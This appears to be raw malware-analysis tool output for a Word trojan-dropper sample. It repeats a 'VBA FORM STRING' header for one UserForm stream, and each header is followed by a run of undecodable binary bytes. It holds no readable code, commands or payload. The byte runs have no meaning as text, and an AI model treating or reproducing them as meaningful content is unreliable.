��*��s�X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ү�R<i-Z9����������>��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:+��v-�=+�=[����^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G֨�_�����*�q[�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>s��O�K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=ƽr�]��	��/��<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȉ
�����d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��k��y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sKs٥��蠾�.TO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
88!H5�o21�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tk'>v�5��@�Cp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T�o�le3�jS_BF��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}:U�ep�Sv=Q���5B��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��K7@���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z��H�l	n;���u�~m�T�N�u+I�1G23�;sּ��2�5�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7~�m,�i\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��*O!'���Y�0��M_NE�d���q�?�E��T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<>1��8g�]����:��ٮ���Y�nH"H�=�1Vk�lx���z��>��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?Ί�{��cOJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!WMRҿ�տ�?�U��;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����4�o�I"�P��]���<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WV�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
85o�VQ=�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:S�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�r�Y��0�禬
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xbŭ�6��Lw:�����WV�;x�0ǸF"L.6��+F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�cs�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_3�kq`�v��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1Q��C��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.}~����k�d�2�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��o`�ӣ�2J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�&�e$9Ǩ������RD�P1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M9/�cmv�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�Z7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���)�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�M8�-Lk�Rl�(���<c���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?Ί.��o�����r��ҿ�տ�?�U꣥ǫ���ռv9*|L��ڋ�2x0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$g�^+��5{-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�Q�&Xm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��w��C䐬
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N?*ʢ�3����Gz%ٚ�����&��'5Y.�Ѓ�^�R�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wi���VQ�Nf�ڷ#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZٮE�!8�A ����X.#�� ܠ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dW7.�o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M9H=K3|�����t�>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-���̒��9"�xa3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���P��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���=��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ko�����x~),'I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ky��h�ۇQ��W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�jv::(����<����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?Ί.��o�����rص
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����u}q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��lKI+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��k�<M���ɤ��,�܃�qpJF>�|���q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/%���v�F��Ʈ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�b�2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j��Řs���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u	RW�:O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�Y�]��T�.�>HPm�>�8Ϲ�޺�
g>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӯ� lM������^T��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�|1�����L��A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������%R�4u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(E�H�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?W��9YU׮}?
�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

k62[�1�Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���.��g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�\S�(;3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T����ـ��I�+;T�,���Ƞ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����nOc����ac
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�K#gh�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�����mB�)[xy+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A���3^/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wiv�v�S[��3�!r��'���״x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<;��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Xg�$m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������8�Ok&z~���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`X��Q�{\.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.?\ע��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<=�5+{�>C�ly��k��W�E��ӭ �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P☥J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�na�Qum �	Ǚ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���σt3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6<{�i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����=?�d�����}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�o���9��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9?�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z��"������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������k��=�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ZA��2$��L�����m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
åfj�M��y�V6r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�z�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CA�b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���zF�.��6+�fK��S"��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҷ��1�3W9�)sY3���ṕY����8N��lc���>��P98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"���C��5�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�k�mR��y��r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x*G�\�Y�˕+2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]��~,_��#�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^O��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=kҾ.��S����#!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p?�y�\�[��V+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��'��q�Lc5�ck�W�G�D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i37/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-h��
-------------------------------------------------------------------------------
